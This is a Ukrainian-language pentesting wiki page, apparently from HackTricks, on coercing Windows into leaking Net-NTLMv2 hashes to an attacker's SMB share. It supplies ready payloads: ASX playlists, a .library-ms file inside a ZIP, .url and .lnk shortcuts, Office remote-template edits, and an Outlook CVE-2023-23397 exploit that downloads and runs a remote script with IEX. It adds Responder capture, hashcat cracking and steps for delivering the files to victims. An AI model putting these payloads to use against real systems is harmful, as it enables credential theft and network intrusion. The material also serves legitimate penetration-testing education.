# Місця для викрадення NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Подивіться всі чудові ідеї з [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — від завантаження microsoft word файлу онлайн до джерела ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md та [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player плейлисти (.ASX/.WAX)

Якщо ви зможете змусити ціль відкрити або переглянути підконтрольний вам Windows Media Player playlist, ви можете leak Net‑NTLMv2, вказавши запис на UNC path. WMP спробує отримати вказане медіа через SMB і здійснить автентифікацію неявно.

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Потік збору та злому:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-вбудований .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer неналежним чином обробляє файли .library-ms, коли вони відкриваються безпосередньо з архіву ZIP. Якщо визначення бібліотеки вказує на віддалений UNC шлях (наприклад, \\attacker\share), просте перегортання/запуск .library-ms всередині ZIP змушує Explorer перерахувати UNC і відправити NTLM-автентифікацію атакеру. Це дає NetNTLMv2, який можна зламати офлайн або потенційно ретранслювати.

Мінімальний .library-ms, що вказує на UNC атакера
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Оперативні кроки
- Створіть файл .library-ms з наведеним вище XML (вкажіть ваш IP/hostname).
- Заархівуйте його (у Windows: Send to → Compressed (zipped) folder) і доставте ZIP до цілі.
- Запустіть NTLM capture listener і дочекайтесь, поки жертва відкриє .library-ms зсередини ZIP.


### Шлях до звуку нагадування календаря Outlook (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows обробляв розширену MAPI-властивість PidLidReminderFileParameter у елементах календаря. Якщо ця властивість вказувала на UNC path (e.g., \\attacker\share\alert.wav), Outlook звертався до SMB share під час спрацьовування нагадування, leaking the user’s Net‑NTLMv2 without any click. Це було виправлено 14 березня 2023 року, але все ще дуже актуально для застарілих/необроблених середовищ і для історичного розслідування інцидентів.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Сторона Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Примітки
- Жертві потрібно лише, щоб Outlook for Windows працював у момент спрацьовування нагадування.
- leak дає Net‑NTLMv2, придатний для offline cracking або relay (не pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer автоматично відображає іконки shortcut. Нещодавні дослідження показали, що навіть після квітневого 2025 патчу Microsoft для UNC‑icon shortcuts все ще можна спровокувати NTLM authentication без кліків, розмістивши shortcut target на UNC path і залишивши іконку локально (обхід патчу отримав CVE‑2025‑50154). Саме перегляд папки змушує Explorer отримувати metadata з remote target, внаслідок чого NTLM відправляється на attacker SMB server.

Мінімальний Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload (.lnk) через PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Помістіть ярлик у ZIP і спонукайте жертву відкрити його.
- Розмістіть ярлик на записуваній мережевій шарі, яку жертва відкриє.
- Поєднайте з іншими файлами-приманками в тій же папці, щоб Explorer показував прев'ю цих елементів.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Документи Office можуть посилатися на зовнішній шаблон. Якщо ви вкажете прикріплений шаблон як UNC path, відкриття документа спричинить автентифікацію в SMB.

Мінімальні зміни відносин DOCX (всередині word/):

1) Відредагуйте word/settings.xml і додайте посилання на прикріплений шаблон:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Відредагуйте word/_rels/settings.xml.rels і вкажіть rId1337 на свій UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Переупакуйте в .docx і передайте. Запустіть ваш SMB capture listener і дочекайтеся відкриття.

For post-capture ideas on relaying or abusing NTLM, check:

{{#ref}}
README.md
{{#endref}}


## Посилання
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
